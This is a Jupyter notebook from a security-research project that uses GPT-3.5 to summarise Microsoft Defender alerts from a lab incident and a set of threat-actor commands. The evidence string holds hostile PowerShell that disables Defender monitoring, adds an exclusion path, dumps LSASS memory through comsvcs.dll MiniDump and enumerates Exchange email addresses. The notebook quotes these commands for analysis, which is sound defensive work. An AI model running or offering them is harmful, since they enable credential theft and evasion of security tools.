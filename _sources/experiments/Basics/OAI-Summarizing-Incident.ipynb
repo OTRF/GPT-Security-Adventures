{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Summarizing: Incident Data\n",
    "---\n",
    "* Collaborators:\n",
    "    * Roberto Rodriguez (@Cyb3rWard0g)\n",
    "* References:\n",
    "* https://techcommunity.microsoft.com/t5/microsoft-defender-for-endpoint/automating-security-operations-using-windows-defender-atp-apis/ba-p/294434\n",
    "* https://www.deeplearning.ai/short-courses/"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Import Modules"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import openai\n",
    "from dotenv import load_dotenv"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Set Open AI Key"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Get your key: https://platform.openai.com/account/api-keys\n",
    "load_dotenv()\n",
    "openai.api_key = os.getenv(\"OPENAI_API_KEY\")"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Create Completion Function"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_completion(prompt, model=\"gpt-3.5-turbo\"):\n",
    "    messages = [{\"role\":\"user\", \"content\":prompt}]\n",
    "    response = openai.ChatCompletion.create(\n",
    "        model=model,\n",
    "        messages=messages,\n",
    "        temperature=0, # Degree of randomness\n",
    "    )\n",
    "    return response.choices[0].message[\"content\"]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Download Incident Data\n",
    "I downloaded the following alerts from incident data I generated in a lab environment"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get Access Token"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "\n",
    "load_dotenv()\n",
    "\n",
    "tenantId = os.getenv(\"AZURE_TENANT_ID\")\n",
    "auth_url = f'https://login.microsoftonline.com/{tenantId}/oauth2/v2.0/token'\n",
    "appId = 'dd410380-6316-4116-ba97-3ff7c439e94f' \n",
    "appSecret = os.getenv(\"INCIDENT_READER_CLIENT_SECRET\")\n",
    "scope = 'https://api.securitycenter.microsoft.com/.default' \n",
    "\n",
    "data = {\n",
    "    'grant_type': 'client_credentials',\n",
    "    'client_id': appId,\n",
    "    'client_secret': appSecret,\n",
    "    'scope': scope\n",
    "}\n",
    "response = requests.post(auth_url, data=data).json()\n",
    "token = response['access_token']"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Query Incident Data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "from scripts.m365d import get_alerts\n",
    "\n",
    "load_dotenv()\n",
    "\n",
    "access_token = token\n",
    "incidentId = \"2444\"\n",
    "alerts = get_alerts(access_token, incidentId)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [],
   "source": [
    "all_alerts = alerts.get('value')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [],
   "source": [
    "alerts_list = []\n",
    "for alert in all_alerts:\n",
    "    alert_dict = dict()\n",
    "    alert_dict['title'] = alert['title']\n",
    "    alert_dict['description'] = alert['description']\n",
    "    alerts_list.append(alert_dict)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Based on the alerts, it appears that there was a suspicious process executed in PowerShell, indicating potential malicious activity. There were also multiple instances of suspicious behavior by an HTML application, suggesting the use of HTML files to deliver malware. Additionally, there were suspicious LDAP queries, indicating reconnaissance activity, and suspicious user account discovery, suggesting attempts to gather information for future attacks. Furthermore, event logs were cleared, an uncommon file was created and added to the startup folder, and suspicious PowerShell commands were executed, all potentially indicating malicious activity. There were also alerts related to potential human-operated malicious activity, suspicious remote activity, suspicious WMI process creation, suspicious PowerShell download or encoded command execution, possible initial access via OneNote, possible ransomware activity, suspicious WMI activity initiated remotely, file backups being deleted, suspicious scheduled task process launched, suspicious sequence of exploration activities, and suspicious remote PowerShell execution. These alerts collectively suggest a significant security incident involving various malicious activities and potential threats such as ransomware.\n"
     ]
    }
   ],
   "source": [
    "prompt = f\"\"\"\n",
    "Prodice a summar of my incident based on the following alerts.\n",
    "Give me a few sentences summarizing what actually happened based\n",
    "on the alerts names and descriptions.\n",
    "\n",
    "Review: ```{alerts_list}```\n",
    "\"\"\"\n",
    "\n",
    "response = get_completion(prompt)\n",
    "print(response)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Script Content Analysis"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Create a Prompt to Create a Summary"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [],
   "source": [
    "evidence = \"\"\"\n",
    "try {Set-MpPreference -DisableBehaviorMonitoring 1 -AsJob; Set-MpPreference -SevereThreatDefaultAction Allow -AsJob; Set-MpPreference -DisableRealtimeMonitoring 1 -AsJob; Add-MpPreference -ExclusionPath 'C:\\Windows' -Force -AsJob} catch {}\n",
    "powershell.exe /c Remove-Item -Path C:\\windows\\temp\\ssasl.pmd -Force -ErrorAction Ignore; rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id C:\\windows\\temp\\ssasl.pmd full | out-host; Compress-Archive  C:\\windows\\temp\\ssasl.pmd  C:\\windows\\temp\\ssasl.zip\n",
    "Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn; Get-Recipient | Select Name -ExpandProperty EmailAddresses -first 1 | Select SmtpAddress | ft -hidetableheaders\"\n",
    "\"\"\""
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Run Prompt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The threat actor disables behavior monitoring and real-time monitoring, adds an exclusion path, removes a file, compresses it, and retrieves email addresses.\n"
     ]
    }
   ],
   "source": [
    "prompt = f\"\"\"\n",
    "Your task is to understand a few commands executed by a threat actor and then generate a summary of it. \n",
    "\n",
    "Summarize the review below, delimited by triple \n",
    "backticks, in at most 20 words. \n",
    "\n",
    "Review: ```{evidence}```\n",
    "\"\"\"\n",
    "\n",
    "response = get_completion(prompt)\n",
    "print(response)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
